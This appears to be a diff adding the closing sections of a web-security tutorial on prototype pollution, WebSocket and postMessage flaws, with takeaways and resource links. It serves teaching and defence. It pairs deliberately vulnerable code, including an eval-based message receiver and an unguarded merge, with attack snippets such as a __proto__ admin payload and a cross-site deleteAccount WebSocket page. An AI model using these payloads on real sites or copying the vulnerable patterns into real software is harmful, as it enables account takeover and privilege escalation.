+**Definition**: Modifying JavaScript object prototypes, affecting all objects.
+
+**Example:**
+
+```javascript
+// Vulnerable merge function
+function merge(target, source) {
+  for (let key in source) {
+    target[key] = source[key];
+  }
+  return target;
+}
+
+// Attack payload
+let payload = JSON.parse('{"__proto__": {"admin": true}}');
+merge({}, payload);
+
+// Now all objects have admin property
+let user = {};
+console.log(user.admin);  // true!
+```
+
+**Client-Side Impact:**
+
+- XSS via polluted properties
+- Authentication bypass
+- Security control bypass
+
+**Mitigation:**
+
+```javascript
+function safeMerge(target, source) {
+  for (let key in source) {
+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+      continue;
+    }
+    if (source.hasOwnProperty(key)) {
+      target[key] = source[key];
+    }
+  }
+}
+```
+
+### WebSocket Vulnerabilities
+
+**Missing Origin Validation:**
+
+```javascript
+// Vulnerable server
+wss.on('connection', function(ws) {
+  // No origin check!
+  ws.on('message', function(msg) {
+    processMessage(msg);
+  });
+});
+```
+
+**Attack:**
+
+```html
+<!-- Attacker's page -->
+<script>
+let ws = new WebSocket('wss://vulnerable.com/socket');
+ws.onopen = function() {
+  ws.send('{"action": "deleteAccount"}');
+};
+</script>
+```
+
+**Mitigation:**
+
+```javascript
+wss.on('connection', function(ws, req) {
+  const origin = req.headers.origin;
+  if (origin !== 'https://trusted.com') {
+    ws.close();
+    return;
+  }
+  // ...
+});
+```
+
+### postMessage Vulnerabilities
+
+**Insecure Receiver:**
+
+```javascript
+// Vulnerable
+window.addEventListener('message', function(e) {
+  // No origin check!
+  eval(e.data);
+});
+```
+
+**Attack:**
+
+```javascript
+targetWindow.postMessage('alert(document.cookie)', '*');
+```
+
+**Secure Implementation:**
+
+```javascript
+window.addEventListener('message', function(e) {
+  // Validate origin
+  if (e.origin !== 'https://trusted.com') {
+    return;
+  }
+
+  // Validate data
+  if (typeof e.data !== 'string') {
+    return;
+  }
+
+  // Safe processing
+  processMessage(e.data);
+});
+```
+
+## Key Takeaways
+
+- XSS remains one of the most critical web vulnerabilities
+- Three main types: Reflected, Stored, and DOM-based
+- Always encode output based on context
+- Use CSP and HTTPOnly cookies as defense-in-depth
+- CSRF requires both prevention mechanisms and secure coding
+- SameSite cookies provide strong CSRF protection
+- Clickjacking needs frame-ancestors CSP or X-Frame-Options
+- Modern JavaScript introduces new attack vectors (Prototype Pollution, DOM Clobbering)
+- WebSockets and postMessage require explicit origin validation
+- Defense requires multiple layers of protection
 
 ## Resources
 
-- <https://portswigger.net/web-security/cross-site-scripting>
-- <https://owasp.org/www-community/attacks/xss/>
-- <https://portswigger.net/web-security/csrf>
-- <https://owasp.org/www-community/attacks/csrf>
-- <https://blog.securityevaluators.com/cracking-javas-rng-for-csrf-ea9cacd231d2>
+### XSS
+
+- OWASP XSS Guide: <https://owasp.org/www-community/attacks/xss/>
+- PortSwigger XSS: <https://portswigger.net/web-security/cross-site-scripting>
+- XSS Filter Evasion: <https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>
+- DOMPurify: <https://github.com/cure53/DOMPurify>
+- Google XSS Game: <https://xss-game.appspot.com/>
+
+### CSRF
+
+- OWASP CSRF: <https://owasp.org/www-community/attacks/csrf>
+- PortSwigger CSRF: <https://portswigger.net/web-security/csrf>
+- SameSite Cookies: <https://web.dev/samesite-cookies-explained/>
+
+### Clickjacking
+
+- OWASP Clickjacking: <https://owasp.org/www-community/attacks/Clickjacking>
+- PortSwigger Clickjacking: <https://portswigger.net/web-security/clickjacking>
+
+### Advanced Topics
+
+- Prototype Pollution: <https://portswigger.net/web-security/prototype-pollution>
+- DOM Clobbering: <https://portswigger.net/web-security/dom-based/dom-clobbering>
+- PostMessage Security: <https://portswigger.net/research/stealing-user-info-with-postmessage>
+
+### Tools
+
+- **Burp Suite**: XSS and CSRF testing
+- **OWASP ZAP**: Automated scanning
+- **XSStrike**: Advanced XSS detection
+- **CSP Evaluator**: <https://csp-evaluator.withgoogle.com/>
+- **BeEF**: Browser Exploitation Framework
